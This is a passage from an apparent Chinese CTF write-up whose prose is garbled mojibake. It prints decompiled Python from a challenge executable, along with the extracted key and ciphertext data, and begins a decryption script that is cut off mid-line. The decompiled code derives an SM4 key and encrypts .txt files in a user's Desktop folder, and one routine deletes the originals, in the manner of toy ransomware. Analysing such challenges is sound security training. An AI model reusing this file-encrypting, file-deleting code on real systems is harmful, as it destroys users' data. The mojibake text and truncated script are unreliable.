class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Decompiled with PyLingual (https://pylingual.io)</span><br><span class="hljs-comment"># Internal filename: task.py</span><br><span class="hljs-comment"># Bytecode version: 3.8.0rc1+ (3413)</span><br><span class="hljs-comment"># Source timestamp: 1970-01-01 00:00:00 UTC (0)</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Created on Sun Mar 30 18:25:08 2025</span><br><span class="hljs-string"></span><br><span class="hljs-string">@author: Crypto0</span><br><span class="hljs-string"></span><br><span class="hljs-string">import re</span><br><span class="hljs-string">import base64</span><br><span class="hljs-string">import os</span><br><span class="hljs-string">import sys</span><br><span class="hljs-string">from gmssl import sm4</span><br><span class="hljs-string">from Crypto.Util.Padding import pad</span><br><span class="hljs-string">import binascii</span><br><span class="hljs-string">from random import shuffle, randrange</span><br><span class="hljs-string"></span><br><span class="hljs-string">N = 49 </span><br><span class="hljs-string">p = 3</span><br><span class="hljs-string">q = 128  </span><br><span class="hljs-string">d = 3</span><br><span class="hljs-string">assert q &gt; (6 * d + 1) * p</span><br><span class="hljs-string">R.&lt;x&gt; = ZZ[]</span><br><span class="hljs-string">def generate_T(d1, d2):</span><br><span class="hljs-string">    assert N &gt;= d1 + d2</span><br><span class="hljs-string">    s = [1] * d1 + [-1] * d2 + [0] * (N - d1 - d2)</span><br><span class="hljs-string">    shuffle(s)</span><br><span class="hljs-string">    return R(s)</span><br><span class="hljs-string"></span><br><span class="hljs-string">def invert_mod_prime(f, p):</span><br><span class="hljs-string">    Rp = R.change_ring(Integers(p)).quotient(x^N - 1)</span><br><span class="hljs-string">    return R(lift(1 / Rp(f)))</span><br><span class="hljs-string"></span><br><span class="hljs-string">def convolution(f, g):</span><br><span class="hljs-string">    return (f * g) % (x^N - 1)</span><br><span class="hljs-string"></span><br><span class="hljs-string">def lift_mod(f, q):</span><br><span class="hljs-string">    return R([((f[i] + q // 2) % q) - q // 2 for i in range(N)])</span><br><span class="hljs-string"></span><br><span class="hljs-string">def poly_mod(f, q):</span><br><span class="hljs-string">    return R([f[i] % q for i in range(N)])</span><br><span class="hljs-string"></span><br><span class="hljs-string">def invert_mod_pow2(f, q):</span><br><span class="hljs-string">    assert q.is_power_of(2)</span><br><span class="hljs-string">    g = invert_mod_prime(f, 2)</span><br><span class="hljs-string">    while True:</span><br><span class="hljs-string">        r = lift_mod(convolution(g, f), q)</span><br><span class="hljs-string">        if r == 1:</span><br><span class="hljs-string">            return g</span><br><span class="hljs-string">        g = lift_mod(convolution(g, 2 - r), q)</span><br><span class="hljs-string"></span><br><span class="hljs-string">def generate_message():</span><br><span class="hljs-string">    return R([randrange(p) - 1 for _ in range(N)])</span><br><span class="hljs-string"></span><br><span class="hljs-string">def generate_key():</span><br><span class="hljs-string">    while True:</span><br><span class="hljs-string">        try:</span><br><span class="hljs-string">            f = generate_T(d + 1, d)</span><br><span class="hljs-string">            g = generate_T(d, d)</span><br><span class="hljs-string">            Fp = poly_mod(invert_mod_prime(f, p), p)</span><br><span class="hljs-string">            Fq = poly_mod(invert_mod_pow2(f, q), q)</span><br><span class="hljs-string">            break</span><br><span class="hljs-string">        except:</span><br><span class="hljs-string">            continue</span><br><span class="hljs-string">    h = poly_mod(convolution(Fq, g), q)</span><br><span class="hljs-string">    return h, (f, g)</span><br><span class="hljs-string"></span><br><span class="hljs-string">def encrypt_message(m, h):</span><br><span class="hljs-string">    e = lift_mod(p * convolution(h, generate_T(d, d)) + m, q)</span><br><span class="hljs-string">    return e</span><br><span class="hljs-string"></span><br><span class="hljs-string">def save_ntru_keys():</span><br><span class="hljs-string">    h, secret = generate_key()</span><br><span class="hljs-string">    with open(&quot;pub_key.txt&quot;, &quot;w&quot;) as f:</span><br><span class="hljs-string">        f.write(str(h))</span><br><span class="hljs-string">    m = generate_message()</span><br><span class="hljs-string">    with open(&quot;priv_key.txt&quot;, &quot;w&quot;) as f:</span><br><span class="hljs-string">        f.write(str(m))</span><br><span class="hljs-string">    e = encrypt_message(m, h)</span><br><span class="hljs-string">    with open(&quot;enc.txt&quot;, &quot;w&quot;) as f:</span><br><span class="hljs-string">        f.write(str(e))</span><br><span class="hljs-string"></span><br><span class="hljs-string">def terms(poly_str):</span><br><span class="hljs-string">    terms = []</span><br><span class="hljs-string">    pattern = r&#x27;([+-]?\\s*x\\^?\\d*|[-+]?\\s*\\d+)&#x27;</span><br><span class="hljs-string">    matches = re.finditer(pattern, poly_str.replace(&#x27; &#x27;, &#x27;&#x27;))</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    for match in matches:</span><br><span class="hljs-string">        term = match.group()</span><br><span class="hljs-string">        if term == &#x27;+x&#x27; or term == &#x27;x&#x27;:</span><br><span class="hljs-string">            terms.append(1)</span><br><span class="hljs-string">        elif term == &#x27;-x&#x27;:</span><br><span class="hljs-string">            terms.append(-1)</span><br><span class="hljs-string">        elif &#x27;x^&#x27; in term:</span><br><span class="hljs-string">            coeff_part = term.split(&#x27;x^&#x27;)[0]</span><br><span class="hljs-string">            exponent = int(term.split(&#x27;x^&#x27;)[1])</span><br><span class="hljs-string">            if not coeff_part or coeff_part == &#x27;+&#x27;:</span><br><span class="hljs-string">                coeff = 1</span><br><span class="hljs-string">            elif coeff_part == &#x27;-&#x27;:</span><br><span class="hljs-string">                coeff = -1</span><br><span class="hljs-string">            else:</span><br><span class="hljs-string">                coeff = int(coeff_part)</span><br><span class="hljs-string">            terms.append(coeff * exponent)</span><br><span class="hljs-string">        elif &#x27;x&#x27; in term:</span><br><span class="hljs-string">            coeff_part = term.split(&#x27;x&#x27;)[0]</span><br><span class="hljs-string">            if not coeff_part or coeff_part == &#x27;+&#x27;:</span><br><span class="hljs-string">                terms.append(1)</span><br><span class="hljs-string">            elif coeff_part == &#x27;-&#x27;:</span><br><span class="hljs-string">                terms.append(-1)</span><br><span class="hljs-string">            else:</span><br><span class="hljs-string">                terms.append(int(coeff_part))</span><br><span class="hljs-string">        else:</span><br><span class="hljs-string">            if term == &#x27;+1&#x27; or term == &#x27;1&#x27;:</span><br><span class="hljs-string">                terms.append(0)</span><br><span class="hljs-string">                terms.append(-0)</span><br><span class="hljs-string">    return terms</span><br><span class="hljs-string"></span><br><span class="hljs-string">def gen_key(poly_terms):</span><br><span class="hljs-string">    binary = [0] * 128</span><br><span class="hljs-string">    for term in poly_terms:</span><br><span class="hljs-string">        exponent = abs(term)</span><br><span class="hljs-string">        if term &gt; 0 and exponent &lt;= 127:  </span><br><span class="hljs-string">            binary[127 - exponent] = 1</span><br><span class="hljs-string">    binary_str = &#x27;&#x27;.join(map(str, binary))</span><br><span class="hljs-string">    hex_key = hex(int(binary_str, 2))[2:].upper().zfill(32)</span><br><span class="hljs-string">    return hex_key</span><br><span class="hljs-string"></span><br><span class="hljs-string">def read_polynomial_from_file(filename):</span><br><span class="hljs-string">    with open(filename, &#x27;r&#x27;) as file:</span><br><span class="hljs-string">        return file.read().strip()</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">def sm4_encrypt(key, plaintext):</span><br><span class="hljs-string">    assert len(key) == 16, &quot;SM4 key must be 16 bytes&quot;</span><br><span class="hljs-string">    cipher = sm4.CryptSM4()</span><br><span class="hljs-string">    cipher.set_key(key, sm4.SM4_ENCRYPT)</span><br><span class="hljs-string">    padded_plaintext = pad(plaintext, 16)</span><br><span class="hljs-string">    return cipher.crypt_ecb(padded_plaintext)</span><br><span class="hljs-string"></span><br><span class="hljs-string">def sm4_encrypt_file(input_path, output_path, key):</span><br><span class="hljs-string">    with open(input_path, &#x27;rb&#x27;) as f:</span><br><span class="hljs-string">        plaintext = f.read()</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    ciphertext = sm4_encrypt(key, plaintext)</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    with open(output_path, &#x27;wb&#x27;) as f:</span><br><span class="hljs-string">        f.write(ciphertext)</span><br><span class="hljs-string"></span><br><span class="hljs-string">def resource_path(relative_path):</span><br><span class="hljs-string">    if getattr(sys, &#x27;frozen&#x27;, False):</span><br><span class="hljs-string">        base_path = sys._MEIPASS</span><br><span class="hljs-string">    else:</span><br><span class="hljs-string">        base_path = os.path.abspath(&quot;.&quot;)</span><br><span class="hljs-string">    return os.path.join(base_path, relative_path)</span><br><span class="hljs-string"></span><br><span class="hljs-string">def encrypt_directory(directory, sm4_key, extensions=[&quot;.txt&quot;]):</span><br><span class="hljs-string">    if not os.path.exists(directory):</span><br><span class="hljs-string">        print(f&quot;Directory does not exist: &#123;directory&#125;&quot;)</span><br><span class="hljs-string">        return</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    for root, _, files in os.walk(directory):</span><br><span class="hljs-string">        for file in files:</span><br><span class="hljs-string">            if any(file.endswith(ext) for ext in extensions):</span><br><span class="hljs-string">                input_path = os.path.join(root, file)</span><br><span class="hljs-string">                output_path = input_path + &quot;.enc&quot;</span><br><span class="hljs-string">                </span><br><span class="hljs-string">                try:</span><br><span class="hljs-string">                    sm4_encrypt_file(input_path, output_path, sm4_key)</span><br><span class="hljs-string">                    os.remove(input_path)</span><br><span class="hljs-string">                    print(f&quot;Encrypted: &#123;input_path&#125; -&gt; &#123;output_path&#125;&quot;)</span><br><span class="hljs-string">                except Exception as e:</span><br><span class="hljs-string">                    print(f&quot;Error encrypting &#123;input_path&#125;: &#123;str(e)&#125;&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">def main():</span><br><span class="hljs-string">    try:</span><br><span class="hljs-string">        save_ntru_keys()</span><br><span class="hljs-string">        poly_str = read_polynomial_from_file(&quot;priv_key.txt&quot;)</span><br><span class="hljs-string">        poly_terms = terms(poly_str)</span><br><span class="hljs-string">        sm4_key = binascii.unhexlify(poly_terms)</span><br><span class="hljs-string">        user_name = os.getlogin()</span><br><span class="hljs-string">        target_dir = os.path.join(&quot;C:\\Users&quot;, user_name, &quot;Desktop&quot;, &quot;test_files&quot;)</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        if not os.path.exists(target_dir):</span><br><span class="hljs-string">            os.makedirs(target_dir, exist_ok=True)</span><br><span class="hljs-string">            print(f&quot;Created directory: &#123;target_dir&#125;&quot;)</span><br><span class="hljs-string">            return</span><br><span class="hljs-string">            </span><br><span class="hljs-string">        txt_files = [f for f in os.listdir(target_dir) </span><br><span class="hljs-string">                    if f.endswith(&#x27;.txt&#x27;) and os.path.isfile(os.path.join(target_dir, f))]</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        if not txt_files:</span><br><span class="hljs-string">            print(&quot;No .txt files found in directory&quot;)</span><br><span class="hljs-string">            return</span><br><span class="hljs-string">            </span><br><span class="hljs-string">        for txt_file in txt_files:</span><br><span class="hljs-string">            file_path = os.path.join(target_dir, txt_file)</span><br><span class="hljs-string">            try:</span><br><span class="hljs-string">                with open(file_path, &#x27;rb&#x27;) as f:</span><br><span class="hljs-string">                    test_data = f.read()</span><br><span class="hljs-string">                </span><br><span class="hljs-string">                ciphertext = sm4_encrypt(sm4_key, test_data)</span><br><span class="hljs-string">                encrypted_path = file_path + &#x27;.enc&#x27;</span><br><span class="hljs-string">                </span><br><span class="hljs-string">                with open(encrypted_path, &#x27;wb&#x27;) as f:</span><br><span class="hljs-string">                f.write(ciphertext)</span><br><span class="hljs-string">            except Exception as e:</span><br><span class="hljs-string">                print(f&quot;Error processing &#123;txt_file&#125;: &#123;str(e)&#125;&quot;)</span><br><span class="hljs-string">                </span><br><span class="hljs-string">    except Exception as e:</span><br><span class="hljs-string">        print(f&quot;Fatal error: &#123;str(e)&#125;&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">if __name__ == &quot;__main__&quot;:</span><br><span class="hljs-string">    main()</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>åœ¨è§£åŒ…åçš„ <code>task.exe_extracted/res</code> ç›®å½•ä¸‹æœ‰ä¸¤ä¸ªæ–‡ä»¶ <code>enc.txt</code> å’Œ <code>pib_key.txt</code> </p><p><img src="https://img.dkdun.cn/v1/2025/12/7f8f59afc9bc0b88.png"></p><p>enc.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">e = <span class="hljs-number">31</span>*x^<span class="hljs-number">48</span> - <span class="hljs-number">14</span>*x^<span class="hljs-number">47</span> + x^<span class="hljs-number">46</span> + <span class="hljs-number">8</span>*x^<span class="hljs-number">45</span> - <span class="hljs-number">9</span>*x^<span class="hljs-number">44</span> - <span class="hljs-number">18</span>*x^<span class="hljs-number">43</span> - <span class="hljs-number">30</span>*x^<span class="hljs-number">41</span> + <span class="hljs-number">14</span>*x^<span class="hljs-number">40</span> + <span class="hljs-number">3</span>*x^<span class="hljs-number">39</span> - <span class="hljs-number">17</span>*x^<span class="hljs-number">38</span> + <span class="hljs-number">22</span>*x^<span class="hljs-number">37</span> + <span class="hljs-number">7</span>*x^<span class="hljs-number">36</span> + <span class="hljs-number">31</span>*x^<span class="hljs-number">34</span> - <span class="hljs-number">30</span>*x^<span class="hljs-number">33</span> - <span class="hljs-number">22</span>*x^<span class="hljs-number">32</span> - <span class="hljs-number">25</span>*x^<span class="hljs-number">31</span> + <span class="hljs-number">31</span>*x^<span class="hljs-number">30</span> - <span class="hljs-number">28</span>*x^<span class="hljs-number">29</span> + <span class="hljs-number">7</span>*x^<span class="hljs-number">28</span> + <span class="hljs-number">23</span>*x^<span class="hljs-number">27</span> - <span class="hljs-number">6</span>*x^<span class="hljs-number">26</span> + <span class="hljs-number">12</span>*x^<span class="hljs-number">25</span> - <span class="hljs-number">6</span>*x^<span class="hljs-number">24</span> + <span class="hljs-number">5</span>*x^<span class="hljs-number">23</span> - <span class="hljs-number">13</span>*x^<span class="hljs-number">22</span> - <span class="hljs-number">10</span>*x^<span class="hljs-number">20</span> + <span class="hljs-number">4</span>*x^<span class="hljs-number">19</span> + <span class="hljs-number">15</span>*x^<span class="hljs-number">18</span> + <span class="hljs-number">23</span>*x^<span class="hljs-number">17</span> + <span class="hljs-number">24</span>*x^<span class="hljs-number">16</span> - <span class="hljs-number">2</span>*x^<span class="hljs-number">15</span> - <span class="hljs-number">8</span>*x^<span class="hljs-number">14</span> - <span class="hljs-number">20</span>*x^<span class="hljs-number">13</span> + <span class="hljs-number">24</span>*x^<span class="hljs-number">12</span> - <span class="hljs-number">23</span>*x^<span class="hljs-number">11</span> - <span class="hljs-number">4</span>*x^<span class="hljs-number">10</span> - <span class="hljs-number">26</span>*x^<span class="hljs-number">9</span> - <span class="hljs-number">14</span>*x^<span class="hljs-number">8</span> + <span class="hljs-number">10</span>*x^<span class="hljs-number">7</span> + <span class="hljs-number">4</span>*x^<span class="hljs-number">6</span> - <span class="hljs-number">4</span>*x^<span class="hljs-number">5</span> - <span class="hljs-number">32</span>*x^<span class="hljs-number">4</span> - <span class="hljs-number">5</span>*x^<span class="hljs-number">3</span> - <span class="hljs-number">31</span>*x^<span class="hljs-number">2</span> + <span class="hljs-number">16</span>*x + <span class="hljs-number">11</span><br>-x^<span class="hljs-number">48</span> - x^<span class="hljs-number">46</span> + x^<span class="hljs-number">45</span> + x^<span class="hljs-number">43</span> - x^<span class="hljs-number">42</span> + x^<span class="hljs-number">41</span> + x^<span class="hljs-number">40</span> + x^<span class="hljs-number">36</span> - x^<span class="hljs-number">35</span> + x^<span class="hljs-number">34</span> - x^<span class="hljs-number">33</span> + x^<span class="hljs-number">32</span> - x^<span class="hljs-number">30</span> + x^<span class="hljs-number">29</span> - x^<span class="hljs-number">28</span> - x^<span class="hljs-number">27</span> - x^<span class="hljs-number">26</span> - x^<span class="hljs-number">25</span> - x^<span class="hljs-number">23</span> - x^<span class="hljs-number">22</span> + x^<span class="hljs-number">21</span> + x^<span class="hljs-number">20</span> + x^<span class="hljs-number">19</span> + x^<span class="hljs-number">18</span> - x^<span class="hljs-number">17</span> - x^<span class="hljs-number">16</span> - x^<span class="hljs-number">15</span> - x^<span class="hljs-number">14</span> - x^<span class="hljs-number">12</span> + x^<span class="hljs-number">9</span> - x^<span class="hljs-number">7</span> - x^<span class="hljs-number">6</span> - x^<span class="hljs-number">5</span> - x^<span class="hljs-number">4</span> + x^<span class="hljs-number">3</span> - x + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>pub_key.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">h = <span class="hljs-number">8</span>*x^<span class="hljs-number">48</span> + <span class="hljs-number">58</span>*x^<span class="hljs-number">47</span> + <span class="hljs-number">18</span>*x^<span class="hljs-number">46</span> + <span class="hljs-number">61</span>*x^<span class="hljs-number">45</span> + <span class="hljs-number">33</span>*x^<span class="hljs-number">44</span> + <span class="hljs-number">21</span>*x^<span class="hljs-number">43</span> + <span class="hljs-number">58</span>*x^<span class="hljs-number">42</span> + <span class="hljs-number">21</span>*x^<span class="hljs-number">41</span> + <span class="hljs-number">5</span>*x^<span class="hljs-number">40</span> + <span class="hljs-number">32</span>*x^<span class="hljs-number">39</span> + <span class="hljs-number">15</span>*x^<span class="hljs-number">38</span> + <span class="hljs-number">40</span>*x^<span class="hljs-number">37</span> + <span class="hljs-number">24</span>*x^<span class="hljs-number">36</span> + <span class="hljs-number">14</span>*x^<span class="hljs-number">35</span> + <span class="hljs-number">40</span>*x^<span class="hljs-number">34</span> + <span class="hljs-number">5</span>*x^<span class="hljs-number">33</span> + x^<span class="hljs-number">32</span> + <span class="hljs-number">48</span>*x^<span class="hljs-number">31</span> + <span class="hljs-number">21</span>*x^<span class="hljs-number">30</span> + <span class="hljs-number">36</span>*x^<span class="hljs-number">29</span> + <span class="hljs-number">42</span>*x^<span class="hljs-number">28</span> + <span class="hljs-number">8</span>*x^<span class="hljs-number">27</span> + <span class="hljs-number">17</span>*x^<span class="hljs-number">26</span> + <span class="hljs-number">54</span>*x^<span class="hljs-number">25</span> + <span class="hljs-number">39</span>*x^<span class="hljs-number">24</span> + <span class="hljs-number">38</span>*x^<span class="hljs-number">23</span> + <span class="hljs-number">14</span>*x^<span class="hljs-number">22</span> + <span class="hljs-number">22</span>*x^<span class="hljs-number">21</span> + <span class="hljs-number">26</span>*x^<span class="hljs-number">20</span> + <span class="hljs-number">22</span>*x^<span class="hljs-number">18</span> + <span class="hljs-number">7</span>*x^<span class="hljs-number">17</span> + <span class="hljs-number">29</span>*x^<span class="hljs-number">16</span> + <span class="hljs-number">53</span>*x^<span class="hljs-number">15</span> + <span class="hljs-number">50</span>*x^<span class="hljs-number">14</span> + <span class="hljs-number">49</span>*x^<span class="hljs-number">13</span> + <span class="hljs-number">21</span>*x^<span class="hljs-number">12</span> + <span class="hljs-number">47</span>*x^<span class="hljs-number">11</span> + <span class="hljs-number">50</span>*x^<span class="hljs-number">10</span> + <span class="hljs-number">32</span>*x^<span class="hljs-number">9</span> + <span class="hljs-number">14</span>*x^<span class="hljs-number">8</span> + <span class="hljs-number">50</span>*x^<span class="hljs-number">7</span> + <span class="hljs-number">18</span>*x^<span class="hljs-number">6</span> + <span class="hljs-number">9</span>*x^<span class="hljs-number">5</span> + <span class="hljs-number">61</span>*x^<span class="hljs-number">4</span> + <span class="hljs-number">10</span>*x^<span class="hljs-number">3</span> + <span class="hljs-number">9</span>*x^<span class="hljs-number">2</span> + <span class="hljs-number">11</span>*x + <span class="hljs-number">47</span><br></code></pre></td></tr></table></figure><p>flag.txt.enc</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">bf<span class="hljs-number">0</span>cb<span class="hljs-number">5</span><span class="hljs-keyword">cc</span><span class="hljs-number">6</span>bea<span class="hljs-number">6146e9</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>f<span class="hljs-number">109</span>df<span class="hljs-number">953</span>a<span class="hljs-number">57</span>daa<span class="hljs-number">416</span>d<span class="hljs-number">38</span>a<span class="hljs-number">8</span>ffba<span class="hljs-number">6438e7</span>e<span class="hljs-number">599613e01</span>f<span class="hljs-number">3</span>b<span class="hljs-number">9</span>a<span class="hljs-number">53</span>dace<span class="hljs-number">4</span>ccd<span class="hljs-number">55</span>cd<span class="hljs-number">3e55</span>ef<span class="hljs-number">88e0</span>b<span class="hljs-number">835</span><br></code></pre></td></tr></table></figure><p>ä» <code>enc.txt</code> çš„ç¬¬äºŒä¸ªå¤šé¡¹å¼ï¼ˆç§é’¥ï¼‰æå–æ­£é¡¹æŒ‡æ•°ï¼ˆå¸¦ + çš„æŒ‡æ•°ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">-x^<span class="hljs-number">48</span> -x^<span class="hljs-number">46</span> +x^<span class="hljs-number">45</span> +x^<span class="hljs-number">43</span> -x^<span class="hljs-number">42</span> +x^<span class="hljs-number">41</span> +x^<span class="hljs-number">40</span> +x^<span class="hljs-number">36</span> -x^<span class="hljs-number">35</span> +x^<span class="hljs-number">34</span> -x^<span class="hljs-number">33</span> +x^<span class="hljs-number">32</span> -x^<span class="hljs-number">30</span> +x^<span class="hljs-number">29</span> -x^<span class="hljs-number">28</span> -x^<span class="hljs-number">27</span> -x^<span class="hljs-number">26</span> -x^<span class="hljs-number">25</span> -x^<span class="hljs-number">23</span> -x^<span class="hljs-number">22</span> +x^<span class="hljs-number">21</span> +x^<span class="hljs-number">20</span> +x^<span class="hljs-number">19</span> +x^<span class="hljs-number">18</span> -x^<span class="hljs-number">17</span> -x^<span class="hljs-number">16</span> -x^<span class="hljs-number">15</span> -x^<span class="hljs-number">14</span> -x^<span class="hljs-number">12</span> +x^<span class="hljs-number">9</span> -x^<span class="hljs-number">7</span> -x^<span class="hljs-number">6</span> -x^<span class="hljs-number">5</span> -x^<span class="hljs-number">4</span> +x^<span class="hljs-number">3</span> -x +<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æ­£é¡¹æŒ‡æ•°åˆ—è¡¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">key_exponents = [<span class="hljs-number">45</span>, <span class="hljs-number">43</span>, <span class="hljs-number">41</span>, <span class="hljs-number">40</span>, <span class="hljs-number">36</span>, <span class="hljs-number">34</span>, <span class="hljs-number">32</span>, <span class="hljs-number">29</span>, <span class="hljs-number">21</span>, <span class="hljs-number">20</span>, <span class="hljs-number">19</span>, <span class="hljs-number">18</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><p>è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> sm4<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-comment"># ç§é’¥å¤šé¡¹å¼ä¸­çš„æ­£é¡¹æŒ‡æ•°</span><br>KEY_EXPONENTS = [<span class="hljs-number">45</span>, <span class="hljs-number">43</span>, <span class="hljs-number">41</span>, <span class="hljs-number">40</span>, <span class="hljs-number">36</span>, <span class="hljs-number">34</span>, <span class="hljs-number">32</span>, <span class="hljs-number">29</span>, <span class="hljs-number">21</span>, <span class="hljs-number">20</span>, <span class="hljs-number">19</span>, <span class="hljs-number">18</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>]<br><br><span class="hljs-comment"># å¯†æ–‡ï¼ˆhexæ ¼å¼ï¼‰</span><br>CIPHER_TEXT_HEX = <span class="hljs-string">&quot;bf0cb5cc6bea6146e9c1f109df953a57daa416d38a8ffba6438e7e599613e01f3b9a53dace4ccd55cd3e55ef88e0b835&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_sm4_key</span>(<span class="hljs-params">exponents</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;ç”Ÿæˆ SM4 å¯†é’¥&quot;&quot;&quot;</span><br>    binary = [<span class="hljs-number">0</span>] * <span class="hljs-number">128</span><br>    <span class="hljs-keyword">for</span> exp <span class="hljs-keyword">in</span> exponents:<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt; exp &lt;= <span class="hljs-number">127</span>:<br>            binary[<span class="hljs-number">127</span> - exp] = <span class="hljs-number">1</span>  <span class="hljs-comment"># è®¡ç®—äºŒè¿›åˆ¶ä½</span><br>    hex_key = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(<span 